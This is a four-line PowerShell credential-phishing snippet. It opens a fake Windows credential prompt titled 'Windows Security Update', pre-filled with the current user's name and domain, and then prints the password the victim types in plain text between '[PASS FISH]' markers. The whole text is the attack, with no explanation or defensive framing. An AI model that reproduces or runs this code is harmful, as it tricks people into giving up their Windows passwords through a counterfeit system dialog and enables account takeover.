$cred=$host.ui.promptforcredential('Windows Security Update','',$env:UserName,$env:UserDomainName);
echo '---------[PASS FISH]----------'
$cred.getnetworkcredential().password;
echo '---------[PASS FISH]----------'
